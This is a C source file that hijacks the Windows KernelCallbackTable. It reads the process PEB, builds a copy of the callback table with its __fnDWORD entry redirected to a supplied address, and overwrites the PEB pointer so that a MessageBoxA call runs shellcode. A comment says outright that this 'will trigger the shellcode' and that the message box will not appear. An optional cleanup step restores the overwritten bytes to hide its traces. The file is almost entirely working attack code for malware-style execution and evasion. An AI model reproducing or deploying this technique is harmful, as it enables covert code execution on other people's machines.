#include <Windows.h>
#include <stdio.h>
#include <ProcessSnapshot.h>
#include "structs.h"
#include "utils.h"

char Buffer[1024]; 

BOOL Check_fnDWORDAfterOverWriting(HANDLE TargetProcess) {
    KERNELCALLBACKTABLE kct;
    DWORD PssSuccess;
    PEB peb;
    PSS_PROCESS_INFORMATION PI;
    SIZE_T lpNumberOfBytesRead;
    HPSS SnapshotHandle;
    PssSuccess = PssCaptureSnapshot(TargetProcess,PSS_QUERY_PROCESS_INFORMATION,NULL,&SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    PssSuccess = PssQuerySnapshot(SnapshotHandle,PSS_QUERY_PROCESS_INFORMATION,&PI,sizeof(PSS_PROCESS_INFORMATION));
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    else {
        ReadProcessMemory(TargetProcess, PI.PebBaseAddress, &peb, sizeof(peb), &lpNumberOfBytesRead);
        if (lpNumberOfBytesRead == 0) {
            printf("[!] [peb]ReadProcessMemory failed: Win32 error %d \n", GetLastError());
            return FALSE;
        }
        else {
            memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
            printf("[i] [AFTER]kct.__fnDWORD : %0-16p \n", (void*)kct.__fnDWORD);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL Get_fnDWViaKCTAndHijack(HANDLE TargetProcess, SIZE_T Size, PVOID WMIsAO_ADD, unsigned char * rawData,  BOOL Clean) {
    KERNELCALLBACKTABLE kct, Newkct;
    PEB peb = {0};
    PSS_PROCESS_INFORMATION PI;
    HPSS SnapshotHandle;
    PVOID pNewkct;
    DWORD PssSuccess, Old;
    BOOL Success;
    SIZE_T lpNumberOfBytesWritten;

    PssSuccess = PssCaptureSnapshot(
        TargetProcess,
        PSS_QUERY_PROCESS_INFORMATION,
        NULL,
        &SnapshotHandle);
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssCaptureSnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    PssSuccess = PssQuerySnapshot(
        SnapshotHandle,
        PSS_QUERY_PROCESS_INFORMATION,
        &PI,
        sizeof(PSS_PROCESS_INFORMATION)
    );
    if (PssSuccess != ERROR_SUCCESS) {
        printf("[!] PssQuerySnapshot failed: Win32 error %d \n", GetLastError());
        return FALSE;
    }
    if (PI.PebBaseAddress == NULL) {
        printf("[!] PI.PebBaseAddress IS NULL \n");
        return FALSE;
    }
    else {
        RtlMoveMemory(&peb, PI.PebBaseAddress, sizeof(PEB));
        if (peb.KernelCallbackTable == 0){
            printf("[!] KernelCallbackTable is NULL : Win32 error %d \n", GetLastError());
            return FALSE;
        }
        else {
            memcpy(&kct, peb.KernelCallbackTable, sizeof(kct));
            printf("[i] [BEFORE]kct.__fnDWORD : %0-16p \n", (void*) kct.__fnDWORD);
            if (Clean ==  TRUE){
                RtlMoveMemory(&Buffer, WMIsAO_ADD, Size);
                if (Buffer == NULL) {
                    printf("[!] Buffer is NULL: Win32 error %d \n", GetLastError());
                    return FALSE;
                }
            }
            /*
            Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_READWRITE, &Old);
            if (Success != TRUE) {
                printf("[!] [1] VirtualProtect failed: Win32 error %d \n", GetLastError());
                return FALSE;
            }
            
            memcpy(WMIsAO_ADD, rawData, Size);

            Success = VirtualProtect(WMIsAO_ADD, Size, PAGE_EXECUTE_READWRITE, &Old);
            if (Success != TRUE) {
                printf("[!] [2] VirtualProtect failed: Win32 error %d \n", GetLastError());
                return FALSE;
            }
            printf("[i] WMIsAO_ADD : %0-16p \n", (void*)WMIsAO_ADD);
            
           */
            memcpy(&Newkct, &kct, sizeof(KERNELCALLBACKTABLE));
            Newkct.__fnDWORD = (ULONG_PTR)WMIsAO_ADD;

            pNewkct = VirtualAlloc(NULL, sizeof(KERNELCALLBACKTABLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            memcpy(pNewkct, &Newkct, sizeof(KERNELCALLBACKTABLE));

           
            Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), PAGE_READWRITE, &Old);
            RtlMoveMemory((PBYTE)PI.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &pNewkct, sizeof(ULONG_PTR));
            Success = VirtualProtect(PI.PebBaseAddress, sizeof(PEB), Old, &Old);
                Check_fnDWORDAfterOverWriting(TargetProcess);
                MessageBoxA(NULL, "test", "test", MB_OK); //this will trigger the shellcode, and u wont see the messagebox ;0
                if (Clean == TRUE) {
                    RtlMoveMemory(WMIsAO_ADD, Buffer, sizeof(Buffer));
                    ZeroMemory(Buffer, sizeof(Buffer));
                }
            return TRUE;
        }
    }
    return FALSE;
}

